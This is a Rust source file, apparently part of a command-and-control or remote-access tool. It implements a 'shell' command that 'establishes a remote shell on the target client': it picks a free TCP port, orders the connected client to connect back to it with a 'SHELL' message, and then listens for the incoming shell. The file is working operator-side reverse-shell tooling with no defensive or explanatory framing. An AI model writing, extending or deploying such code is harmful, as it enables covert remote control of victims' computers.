use std::net::TcpListener;

use crate::commands::{Command, CommandHandler};
use crate::shell::listen;

pub struct CommandShell;

impl Command for CommandShell {
    fn name(&self) -> String {
        String::from("shell")
    }

    fn description(&self) -> String {
        format!(
            "{} {}",
            self.name(),
            "- Establishes a remote shell on the target client "
        )
    }

    fn execute(&self, handler: &CommandHandler, _args: Vec<String>) -> Result<(), String> {
        let mut port: u16 = 9500;
        //Bind a TCP listener on an available port
        loop {
            match TcpListener::bind(format!("0.0.0.0:{}", port)) {
                Ok(_) => break,
                Err(e) => {
                    port += 1;
                    if port > 9999 {
                        return Err(format!("Error while starting tcp server: {}", e));
                    }
                }
            }
        }
        let mut connections = handler.connections.lock().unwrap();
        match connections.send_message(format!("SHELL\n\r{}", port)) {
            Ok(res) => {
                if res.starts_with("OK") {
                    match listen(port) {
                        Ok(_) => Ok(()),
                        Err(e) => Err(e.to_string()),
                    }
                } else {
                    Err("Unknown error!".to_string())
                }
            }
            Err(e) => Err(e),
        }
    }

    fn alias(&self) -> String {
        String::from("sh")
    }
}
